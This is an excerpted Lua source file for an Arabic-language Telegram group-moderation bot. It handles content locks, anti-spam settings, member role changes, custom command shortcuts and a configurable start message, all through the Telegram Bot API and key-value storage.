AliNight:set(Night..'Abs:SudosGp'..data.sender_user_id_..data.chat_id_,"Abs")
end
...
AliNight:set(Night.."Abs:Groups:Links"..data.chat_id_,LinkGroup) 
...
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=data.chat_id_},function(arg,dp) 
if not AliNight:sismember(Night..'Abs:Groups',data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "✯︙المجموعه بالتاكيد معطله") 
else
Text = "✯︙تم تعطيل المجموعه "..dp.title_
keyboard = {}
keyboard.inline_keyboard = {{{text="‹ غادر ›",callback_data="/LeaveBot:"..data.sender_user_id_},{text="‹ تفعيل ›",callback_data="/On:"..data.sender_user_id_}},{{text="‹ Night TeaM ›",url="t.me/sheserlo0"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
AliNight:srem(Night.."Abs:Groups",data.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
Text = "✯︙تم ترتيب الاوامر بالشكل التالي ~\n✯︙ايدي - ا .\n✯︙رفع مميز - م .\n✯︙رفع ادمن - اد .\n✯︙رفع مدير - مد . \n✯︙رفع منشى - من . \n✯︙رفع منشئ الاساسي - اس  .\n✯︙رفع مطور - مط .\n✯︙رفع مطور ثانوي - ثانوي .\n✯︙تنزيل الكل - تك .\n✯︙تعطيل الايدي بالصوره - تعط .\n✯︙تفعيل الايدي بالصوره - تفع .\n✯︙الرابط - ر .\n✯︙ردود المدير - رر .\n✯︙مسح المكتومين - ،، .\n✯︙اضف رد - رد .\n✯︙مسح سحكاتي - سح .\n✯︙مسح رسائلي - رس .\n✯︙غنيلي - غ .\n✯︙مسح قائمه العام"
keyboard = {} 
keyboard.inline_keyboard = {{{text="‹ رجوع ›",callback_data="/Reload:"..data.sender_user_id_}},{{text='‹ Night TeaM ›',url="t.me/sheserlo0"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
AliNight:sadd(Night..'Abs:BasicConstructor:'..data.chat_id_,Manager_id)  
AliNight:sadd(Night..'Abs:AbsConstructor:'..data.chat_id_,Manager_id)   
end  
end  
if num == 0 then
...
local DelSudoRep = AliNight:get(Night..'DelSudoRep')
AliNight:del(Night.."Abs:Sudo:AllRed",DelSudoRep)
AliNight:del(Night.."Abs:Add:AllText"..data.sender_user_id_)
AliNight:del(Night.."Abs:Add:AllRed"..data.sender_user_id_)
AliNight:del(Night.."DelSudoRep")
Text = "✯︙تم الغاء حفظ الرد"
keyboard = {} 
keyboard.inline_keyboard = {{{text = '✯ Night TeaM .',url="t.me/sheserlo0"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
...
local DelManagerRep = AliNight:get(Night..'DelManagerRep'..data.chat_id_)
AliNight:srem(Night..'Abs:Manager:GpRed'..data.chat_id_,DelManagerRep)
AliNight:del(Night..'Abs:Add:GpText'..data.sender_user_id_..data.chat_id_)
AliNight:del(Night..'Abs:Add:GpRed'..data.sender_user_id_..data.chat_id_)
AliNight:del(Night..'DelManagerRep'..data.chat_id_)
Text = "✯︙تم الغاء حفظ الرد"
keyboard = {} 
keyboard.inline_keyboard = {{{text = '✯ Night TeaM .',url="t.me/sheserlo0"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local Cmd = AliNight:get(Night..'Abs:Cmd')
local Text = [[
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local Msg = AliNight:get(Night..'Abs:Msg')
local Text = [[
...
AliNight:del(Night..'Abs:EditMsg'..data.chat_id_..data.sender_user_id_)
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local Filter = AliNight:get(Night..'Abs:Filter')
local Text = [[
...
AliNight:del(Night.."Abs:FilterAnimation"..data.chat_id_)
...
AliNight:del(Night.."Abs:FilterSteckr"..data.chat_id_)
...
AliNight:del(Night.."Abs:FilterPhoto"..data.chat_id_)
...
AliNight:del(Night..'Abs:Filters:'..data.chat_id_)
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local locklist = AliNight:get(Night..'Abs:locklist')
local Text = [[
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local LockBotList = AliNight:get(Night..'Abs:LockBotList')
local Text = [[
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local LockSpamList = AliNight:get(Night..'Abs:LockSpamList')
local Text = [[
...
if not AliNight:get(Night..'Abs:Lock:Join'..data.chat_id_) then
AliNight:set(Night..'Abs:Lock:Join'..data.chat_id_,true)
...
if AliNight:get(Night..'Abs:Lock:Join'..data.chat_id_) then
AliNight:del(Night..'Abs:Lock:Join'..data.chat_id_)
...
if not AliNight:get(Night..'Abs:Lock:Text'..data.chat_id_) then
AliNight:set(Night..'Abs:Lock:Text'..data.chat_id_,true)
...
if AliNight:get(Night..'Abs:Lock:Text'..data.chat_id_) then
AliNight:del(Night..'Abs:Lock:Text'..data.chat_id_)
...
if not AliNight:get(Night..'Abs:Lock:TagServr'..data.chat_id_) then
AliNight:set(Night..'Abs:Lock:TagServr'..data.chat_id_,true)
...
if AliNight:get(Night..'Abs:Lock:TagServr'..data.chat_id_) then
AliNight:del(Night..'Abs:Lock:TagServr'..data.chat_id_) 
...
if not AliNight:get(Night..'Abs:Lock:EditMsgs'..data.chat_id_) then
AliNight:set(Night..'Abs:Lock:EditMsgs'..data.chat_id_,true)
...
if AliNight:get(Night..'Abs:Lock:EditMsgs'..data.chat_id_) then
AliNight:del(Night..'Abs:Lock:EditMsgs'..data.chat_id_)
...
if not AliNight:get(Night..'Abs:Lock:Stickers'..data.chat_id_) then
AliNight:set(Night..'Abs:Lock:Stickers'..data.chat_id_,true)
...
if AliNight:get(Night..'Abs:Lock:Stickers'..data.chat_id_) then
AliNight:del(Night..'Abs:Lock:Stickers'..data.chat_id_)
...
if not AliNight:get(Night..'Abs:Lock:Gifs'..data.chat_id_) then
AliNight:set(Night..'Abs:Lock:Gifs'..data.chat_id_,true)
...
if AliNight:get(Night..'Abs:Lock:Gifs'..data.chat_id_) then
AliNight:del(Night..'Abs:Lock:Gifs'..data.chat_id_)
...
if not AliNight:get(Night..'Abs:Lock:Photo'..data.chat_id_) then
AliNight:set(Night..'Abs:Lock:Photo'..data.chat_id_,true) 
...
if AliNight:get(Night..'Abs:Lock:Photo'..data.chat_id_) then
AliNight:del(Night..'Abs:Lock:Photo'..data.chat_id_)
...
if not AliNight:get(Night..'Abs:Lock:Videos'..data.chat_id_) then
AliNight:set(Night..'Abs:Lock:Videos'..data.chat_id_,true)
...
if AliNight:get(Night..'Abs:Lock:Videos'..data.chat_id_) then
AliNight:del(Night..'Abs:Lock:Videos'..data.chat_id_)
...
if not AliNight:get(Night..'Abs:Lock:Forwards'..data.chat_id_) then
AliNight:set(Night..'Abs:Lock:Forwards'..data.chat_id_,true)
...
if AliNight:get(Night..'Abs:Lock:Forwards'..data.chat_id_) then
AliNight:del(Night..'Abs:Lock:Forwards'..data.chat_id_) 
...
AliNight:set(Night.."Abs:Lock:Bots"..data.chat_id_,"kick")  
...
AliNight:set(Night.."Abs:Lock:Bots"..data.chat_id_,"ked")   
...
AliNight:set(Night.."Abs:Lock:Bots"..data.chat_id_,"del")  
...
AliNight:del(Night.."Abs:Lock:Bots"..data.chat_id_) 
...
AliNight:hset(Night.."Abs:Spam:Group:User"..data.chat_id_ ,"Spam:User","kick")  
...
AliNight:hset(Night.."Abs:Spam:Group:User"..data.chat_id_ ,"Spam:User","keed")  
...
AliNight:hset(Night.."Abs:Spam:Group:User"..data.chat_id_ ,"Spam:User","del")  
...
AliNight:hset(Night.."Abs:Spam:Group:User"..data.chat_id_ ,"Spam:User","mute")  
...
AliNight:hdel(Night.."Abs:Spam:Group:User"..data.chat_id_ ,"Spam:User")  
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local Source = AliNight:get(Night..'Abs:Source')
local Text = [[
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local Media = AliNight:get(Night..'Abs:Media')
local Text = [[
...
local List = AliNight:smembers(Night.."Abs:cleaner"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
if Del ~= 0 then
Ali_Night(data.chat_id_, data.id_, 1, "✯︙تم حذف "..Del.." من الميديا", 1, 'md') 
AliNight:del(Night.."Abs:cleaner"..data.chat_id_)
else
...
local List = AliNight:smembers(Night.."Abs:cleanermusic"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
if Del ~= 0 then
Ali_Night(data.chat_id_, data.id_, 1, "✯︙تم حذف "..Del.." من الاغاني", 1, 'md') 
AliNight:del(Night.."Abs:cleanermusic"..data.chat_id_)
else
...
if AliNight:get(Night.."Abs:Left:Bot"..Night) then
...
if not AliNight:get(Night.."Abs:Lock:GpLinksinline"..data.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=data.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..data.chat_id_)) or AliNight:get(Night.."Private:Group:Link"..data.chat_id_) 
...
if not AliNight:get(Night..'Abs:Lock:GpLinks'..data.chat_id_) then 
if AliNight:get(Night.."Abs:Groups:Links"..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "✯︙Group Link ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..AliNight:get(Night.."Abs:Groups:Links"..data.chat_id_), 1, "html")
else 
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local order = AliNight:get(Night..'Abs:order')
local Text = [[
...
AliNight:set(Night..'Abs:Lock:Id:Photo'..data.chat_id_,true)
...
AliNight:del(Night..'Abs:Lock:Id:Photo'..data.chat_id_)
...
AliNight:set(Night..'Abs:Lock:Id'..data.chat_id_,true)
...
AliNight:del(Night..'Abs:Lock:Id'..data.chat_id_)
...
AliNight:set(Night.."Abs:Lock:GpLinks"..data.chat_id_,"ok")
...
AliNight:del(Night.."Abs:Lock:GpLinks"..data.chat_id_)
...
AliNight:set(Night.."Abs:Lock:GpLinksinline"..data.chat_id_,"ok")
...
AliNight:del(Night.."Abs:Lock:GpLinksinline"..data.chat_id_)
...
AliNight:del(Night.."Abs:Lock:Welcome"..data.chat_id_)
...
AliNight:set(Night.."Abs:Lock:Welcome"..data.chat_id_,true)
...
AliNight:set(Night..'Abs:Lock:AllRed'..data.chat_id_,true)
...
AliNight:del(Night..'Abs:Lock:AllRed'..data.chat_id_)
...
AliNight:set(Night..'Abs:Lock:GpRed'..data.chat_id_,true)
...
AliNight:del(Night..'Abs:Lock:GpRed'..data.chat_id_)
...
AliNight:set(Night.."Abs:Del:Me"..data.chat_id_, true)
Text = "*✯︙تم تعطيل نزلني*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
AliNight:del(Night.."Abs:Del:Me"..data.chat_id_)
Text = "*✯︙تم تفعيل نزلني*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
AliNight:set(Night.."Abs:Kick:Me"..data.chat_id_, true)
...
AliNight:del(Night.."Abs:Kick:Me"..data.chat_id_)
...
AliNight:set(Night.."Abs:Lock:KickBan"..data.chat_id_,"true")
Text = "*✯︙تم تعطيل الحظر*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
AliNight:del(Night.."Abs:Lock:KickBan"..data.chat_id_)
Text = "*✯︙تم تفعيل الحظر*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
AliNight:set(Night.."Abs:Lock:ProSet"..data.chat_id_,"true")
Text = "*✯︙تم تعطيل الرفع*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
AliNight:del(Night.."Abs:Lock:ProSet"..data.chat_id_)
Text = "*✯︙تم تفعيل الرفع*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
AliNight:set(Night..'Abs:Lock:Games'..data.chat_id_,true)  
...
AliNight:del(Night..'Abs:Lock:Games'..data.chat_id_) 
...
if NewCmmd then
AliNight:del(Night.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
AliNight:del(Night.."Set:Cmd:Group:New"..msg.chat_id_)
AliNight:srem(Night.."List:Cmd:Group:New"..msg.chat_id_,text)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم حذف الامر من المجموعه", 1, 'html')  
else
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙لايوجد امر بهذا الاسم", 1, 'html')
end
...
if text and AliNight:get(Night.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
AliNight:set(Night.."Set:Cmd:Group:New"..msg.chat_id_,text)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙ارسل الامر الجديد", 1, 'html')
AliNight:del(Night.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
AliNight:set(Night.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and AliNight:get(Night.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = AliNight:get(Night.."Set:Cmd:Group:New"..msg.chat_id_)
AliNight:set(Night.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
AliNight:sadd(Night.."List:Cmd:Group:New"..msg.chat_id_,text)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم حفظ الامر", 1, 'html')
AliNight:del(Night.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = AliNight:smembers(Night.."List:Cmd:Group:New"..msg.chat_id_.."") 
...
local List = AliNight:smembers(Night.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
AliNight:del(Night.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
...
AliNight:set(Night.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
AliNight:sadd(Night.."List:Cmd:Group:New"..msg.chat_id_,"مط")
AliNight:set(Night.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
AliNight:sadd(Night.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
...
AliNight:set(Night.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
AliNight:sadd(Night.."List:Cmd:Group:New"..msg.chat_id_,"ر")
AliNight:set(Night.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
AliNight:sadd(Night.."List:Cmd:Group:New"..msg.chat_id_,"رر")
AliNight:set(Night.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
AliNight:sadd(Night.."List:Cmd:Group:New"..msg.chat_id_,"،،")
AliNight:set(Night.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
AliNight:sadd(Night.."List:Cmd:Group:New"..msg.chat_id_,"رد")
AliNight:set(Night.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
AliNight:sadd(Night.."List:Cmd:Group:New"..msg.chat_id_,"سح")
AliNight:set(Night.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
AliNight:sadd(Night.."List:Cmd:Group:New"..msg.chat_id_,"رس")
...
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" and ChCheck(msg) or text == "مسح امر" and ChCheck(msg) then 
AliNight:set(Night.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
return false
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "الصلاحيات" and ChCheck(msg) or text == "صلاحيات" and ChCheck(msg) then 
local List = AliNight:smembers(Night.."Coomds"..msg.chat_id_)
if #List == 0 then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙لاتوجد صلاحيات مضافه", 1, 'html')
return false
end
...
local List = AliNight:smembers(Night.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
AliNight:del(Night.."Comd:New:rt:Abs:"..v..msg.chat_id_)
AliNight:del(Night.."Coomds"..msg.chat_id_)
end
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم حذف الصلاحيات المضافه", 1, 'html')
end
end
...
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تستطيع اضافة صلاحية ( عضو • مميز  • ادمن )\n✯︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not Manager(msg) then 
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تستطيع اضافة صلاحية ( عضو • مميز )\n✯︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not Admin(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تستطيع اضافة صلاحية ( عضو )\n✯︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
...
local Ali_Night = text:match("رفع (.*)")
if AliNight:sismember(Night.."Coomds"..msg.chat_id_,Ali_Night) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrAbs = AliNight:get(Night.."Comd:New:rt:Abs:"..Ali_Night..msg.chat_id_)
if mrAbs == "مميز" and VipMem(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sheserlo0')..')'..' ❩\n✯︙تم رفعه ❨ '..Ali_Night..' ❩ بنجاح', 1, 'md')
AliNight:set(Night.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,Ali_Night) 
...
local Ali_Night = text:match("تنزيل (.*)")
if AliNight:sismember(Night.."Coomds"..msg.chat_id_,Ali_Night) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrAbs = AliNight:get(Night.."Comd:New:rt:Abs:"..Ali_Night..msg.chat_id_)
if mrAbs == "مميز" and VipMem(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sheserlo0')..')'..' ❩\n✯︙تم تنزيله ❨ '..Ali_Night..' ❩ بنجاح', 1, 'md')
AliNight:srem(Night..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
AliNight:del(Night.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrAbs == "ادمن" and Admin(msg) then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sheserlo0')..')'..' ❩\n✯︙تم تنزيله ❨ '..Ali_Night..' ❩ بنجاح', 1, 'md')
...
if AliNight:sismember(Night.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrAbs = AliNight:get(Night.."Comd:New:rt:Abs:"..text1[2]..msg.chat_id_)
if mrAbs == "مميز" and VipMem(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'NightTEAM')..')'..' ❩\n✯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
AliNight:sadd(Night..'Abs:VipMem:'..msg.chat_id_, result.id_)
AliNight:set(Night.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrAbs == "ادمن" and Admin(msg) then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'NightTEAM')..')'..' ❩\n✯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
AliNight:sadd(Night..'Abs:Admins:'..msg.chat_id_, result.id_)
AliNight:set(Night.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrAbs == "مدير" and Manager(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'NightTEAM')..')'..' ❩\n✯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
AliNight:sadd(Night..'Abs:Managers:'..msg.chat_id_, result.id_)
AliNight:set(Night.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrAbs == "عضو" then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'NightTEAM')..')'..' ❩\n✯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
AliNight:srem(Night..'Abs:VipMem:'..msg.chat_id_, result.id_)
AliNight:del(Night.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrAbs == "ادمن" and Admin(msg) then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'NightTEAM')..')'..' ❩\n✯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
AliNight:srem(Night..'Abs:Admins:'..msg.chat_id_, result.id_)
AliNight:del(Night.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrAbs == "مدير" and Manager(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'NightTEAM')..')'..' ❩\n✯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
AliNight:srem(Night..'Abs:Managers:'..msg.chat_id_, result.id_)
AliNight:del(Night.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrAbs == "عضو" then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'NightTEAM')..')'..' ❩\n✯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
AliNight:incr(Night..'Abs:UsersMsgs'..Night..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
AliNight:incr(Night..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
AliNight:incr(Night..'Abs:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not AliNight:sismember(Night.."Abs:Users",msg.chat_id_) then
AliNight:sadd(Night.."Abs:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == '/start' then  
if not AliNight:get(Night..'Abs:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp)
tdcli_function({ID="GetUser",user_id_=Night},function(arg,dpbot)
local inline = {
{{text="✯ المطور .",url="t.me/"..(dp.username_ or "NightTEAM")}},
{{text="✯ السورس .",url="https://t.me/sheserlo0"},{text="✯ لتنصيب بوت .",url="https://t.me/sheserlo0/6109"}},{{text="✯ اضفني في مجموعتك .",url="t.me/"..dpbot.username_.."?startgroup=botstart"}}
}
local start = AliNight:get(Night.."Abs:Start:Bot")
if start then 
Start_Source = start
else
...
AliNight:setex(Night..'Abs:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if not SecondSudo(msg) and not AliNight:sismember(Night..'Abs:Ban:Pv',msg.sender_user_id_) and not AliNight:get(Night..'Abs:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Ali_Night(msg.sender_user_id_, msg.id_, 1, '✯︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "NightTEAM")..')', 1, 'md') 
...
AliNight:sadd(Night..'Abs:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '✯︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n✯︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
AliNight:srem(Night..'Abs:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙العضو قام بحظر البوت لا تستطيع ارسال الرسائل له', 1, 'md')
return false  
end 
if text then
Ali_Night(id_user, 0, 1, text, 1, "md")  
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and AliNight:get(Night..'Abs:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء حفظ كليشة الستارت', 1, 'md')
AliNight:del(Night..'Abs:Start:Bots'..msg.sender_user_id_) 
return false
end
AliNight:set(Night.."Abs:Start:Bot",text)  
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم حفظ كليشة الستارت', 1, 'md')
AliNight:del(Night..'Abs:Start:Bots'..msg.sender_user_id_) 
return false
end
if SecondSudo(msg) then
if text == 'ضع كليشه ستارت' and ChCheck(msg) or text == '↫ ضع كليشه ستارت ✯' and ChCheck(msg) then 
AliNight:set(Night..'Abs:Start:Bots'..msg.sender_user_id_,true) 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙ارسل لي كليشة الستارت الان', 1, 'md')
return false
end
if text == 'حذف كليشه ستارت' and ChCheck(msg) or text == '↫ حذف كليشه ستارت ✯' and ChCheck(msg) then 
AliNight:del(Night..'Start:Bot') 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم حذف كليشة الستارت بنجاح', 1, 'md')
end
...
